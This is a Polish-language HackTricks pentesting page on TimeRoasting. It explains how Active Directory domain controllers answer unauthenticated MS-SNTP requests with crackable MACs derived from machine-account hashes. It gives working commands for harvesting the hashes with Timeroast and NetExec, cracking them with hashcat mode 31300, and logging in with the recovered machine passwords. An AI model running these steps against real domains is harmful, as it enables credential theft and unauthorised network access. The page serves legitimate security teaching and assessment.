# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting wykorzystuje starsze rozszerzenie uwierzytelniania MS-SNTP. W MS-SNTP klient może wysłać 68-bajtowe żądanie zawierające dowolny RID konta komputera; kontroler domeny używa hasha NTLM (MD4) konta komputera jako klucza do obliczenia MAC dla odpowiedzi, a następnie ją zwraca.<sup>[[1]](#references)</sup> Atakujący mogą bez uwierzytelniania zbierać te wartości MAC MS-SNTP i łamać je offline (tryb 31300 Hashcat), aby odzyskać hasła kont komputerów.<sup>[[2]](#references)</sup>

Szczegóły znajdują się w sekcji 3.1.5.1 „Authentication Request Behavior” oraz 4 „Protocol Examples” oficjalnej specyfikacji MS-SNTP.<sup>[[1]](#references)</sup>
![TimeRoasting: Szczegóły znajdują się w sekcji 3.1.5.1 „Authentication Request Behavior” oraz 4 „Protocol Examples” oficjalnej specyfikacji MS-SNTP](../../images/Pasted%20image%2020250709114508.png)
Gdy element ADM ExtendedAuthenticatorSupported ma wartość false, klient wysyła 68-bajtowe żądanie i umieszcza RID w najmniej znaczących 31 bitach podpola Key Identifier authenticatora.<sup>[[1]](#references)</sup>

> Jeśli element ADM ExtendedAuthenticatorSupported ma wartość false, klient MUSI skonstruować komunikat Client NTP Request. Długość komunikatu Client NTP Request wynosi 68 bajtów. Klient ustawia pole Authenticator komunikatu Client NTP Request zgodnie z opisem w sekcji 2.2.1, zapisując najmniej znaczące 31 bitów wartości RID w najmniej znaczących 31 bitach podpola Key Identifier authenticatora, a następnie zapisując wartość Key Selector w najbardziej znaczącym bicie podpola Key Identifier.<sup>[[1]](#references)</sup>

Z sekcji 4 (Protocol Examples):

> Po otrzymaniu żądania serwer sprawdza, czy rozmiar otrzymanego komunikatu wynosi 68 bajtów. Zakładając, że rozmiar otrzymanego komunikatu wynosi 68 bajtów, serwer wyodrębnia z niego RID. Serwer używa go do wywołania metody NetrLogonComputeServerDigest (określonej w sekcji 3.5.4.8.2 dokumentu [MS-NRPC]) w celu obliczenia sum kontrolnych kryptograficznych i wybrania sumy kontrolnej kryptograficznej na podstawie najbardziej znaczącego bitu podpola Key Identifier otrzymanego komunikatu, zgodnie z opisem w sekcji 3.2.5. Następnie serwer wysyła odpowiedź do klienta, ustawiając pole Key Identifier na 0 oraz pole Crypto-Checksum na obliczoną sumę kontrolną kryptograficzną.<sup>[[1]](#references)</sup>

Suma kontrolna kryptograficzna jest oparta na MD5 (zob. 3.2.5.1.1) i może być łamana offline, umożliwiając przeprowadzenie ataku roastingowego.<sup>[[1]](#references)</sup>

## Jak przeprowadzić atak

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - skrypty do Timeroasting autorstwa Toma Tervoorta<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Praktyczny atak (bez uwierzytelnienia) z NetExec + Hashcat

- NetExec może bez uwierzytelnienia enumerować i zbierać wartości MS-SNTP MAC dla RID-ów komputerów oraz wyświetlać hashe `$sntp-ms$` gotowe do złamania:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline za pomocą Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Odzyskany tekst jawny odpowiada hasłu konta komputera. Spróbuj użyć go bezpośrednio jako konto komputera z wykorzystaniem Kerberos (-k), gdy NTLM jest wyłączony:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Wskazówki operacyjne
- Przed użyciem Kerberos upewnij się, że synchronizacja czasu jest dokładna: `sudo ntpdate <dc_fqdn>`
- W razie potrzeby wygeneruj krb5.conf dla realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Później zmapuj RID-y na principal za pomocą LDAP/BloodHound, gdy uzyskasz dowolny authenticated foothold.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – oficjalna dokumentacja](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
